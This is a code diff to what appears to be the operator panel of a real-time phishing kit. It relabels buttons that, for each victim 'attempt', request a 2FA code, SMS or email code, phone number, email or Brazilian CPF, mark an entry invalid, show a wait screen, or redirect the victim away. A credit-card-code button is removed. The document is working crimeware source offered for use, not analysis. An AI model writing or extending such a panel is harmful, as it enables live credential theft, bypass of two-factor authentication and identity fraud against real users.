@@ -716,31 +716,28 @@ function AdminPanel() {
 
                     {/* Commands Bar */}
                     <div className="px-3 py-2 flex items-center gap-1 flex-wrap border-b border-[#161822] bg-[#0b0c11]">
-                      <button onClick={() => sendCommand(attempt.id, "INV")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400 hover:bg-red-500/20 border border-red-500/20 transition-all">INV</button>
+                      <button onClick={() => sendCommand(attempt.id, "INV")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400 hover:bg-red-500/20 border border-red-500/20 transition-all">Inválido</button>
                       
-                      <button onClick={() => sendCommand(attempt.id, "AUT")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">AUT</button>
+                      <button onClick={() => sendCommand(attempt.id, "AUT")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">2FAS</button>
                       <button onClick={() => sendInvalidCommand(attempt.id, "AUT")} className="px-1.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400/60 hover:text-red-400 hover:bg-red-500/20 transition-all">✕</button>
                       
-                      <button onClick={() => sendCommand(attempt.id, "EMAIL")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">EMAIL</button>
+                      <button onClick={() => sendCommand(attempt.id, "EMAIL")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">Pedir email</button>
                       <button onClick={() => sendInvalidCommand(attempt.id, "EMAIL")} className="px-1.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400/60 hover:text-red-400 hover:bg-red-500/20 transition-all">✕</button>
                       
-                      <button onClick={() => openRefModal(attempt.id, "TOK-TEL")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">TOK-TEL</button>
+                      <button onClick={() => openRefModal(attempt.id, "TOK-TEL")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">Cod SMS</button>
                       <button onClick={() => sendInvalidCommand(attempt.id, "TOK-TEL")} className="px-1.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400/60 hover:text-red-400 hover:bg-red-500/20 transition-all">✕</button>
                       
-                      <button onClick={() => sendCommand(attempt.id, "TELEFONE")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">Nº TEL</button>
+                      <button onClick={() => sendCommand(attempt.id, "TELEFONE")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">N° Celular</button>
                       <button onClick={() => sendInvalidCommand(attempt.id, "TELEFONE")} className="px-1.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400/60 hover:text-red-400 hover:bg-red-500/20 transition-all">✕</button>
                       
-                      <button onClick={() => openRefModal(attempt.id, "TOK-MAIL")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">TOK-MAIL</button>
+                      <button onClick={() => openRefModal(attempt.id, "TOK-MAIL")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">Cod EMAIL</button>
                       <button onClick={() => sendInvalidCommand(attempt.id, "TOK-MAIL")} className="px-1.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400/60 hover:text-red-400 hover:bg-red-500/20 transition-all">✕</button>
                       
-                      <button onClick={() => sendCommand(attempt.id, "CPF")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">CPF</button>
+                      <button onClick={() => sendCommand(attempt.id, "CPF")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">Pedir CPF</button>
                       <button onClick={() => sendInvalidCommand(attempt.id, "CPF")} className="px-1.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400/60 hover:text-red-400 hover:bg-red-500/20 transition-all">✕</button>
                       
-                      <button onClick={() => openRefModal(attempt.id, "COD-CC")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">Cod CC</button>
-                      <button onClick={() => sendInvalidCommand(attempt.id, "COD-CC")} className="px-1.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400/60 hover:text-red-400 hover:bg-red-500/20 transition-all">✕</button>
-                      
-                      <button onClick={() => sendCommand(attempt.id, "AGUARDE")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">👍</button>
-                      <button onClick={() => sendCommand(attempt.id, "REDIRECT")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">Close</button>
+                      <button onClick={() => sendCommand(attempt.id, "AGUARDE")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">Aguarde</button>
+                      <button onClick={() => sendCommand(attempt.id, "REDIRECT")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">Expulsar</button>
                     </div>
 
                     {/* Data - Compacto: Login + Último dado recebido */}
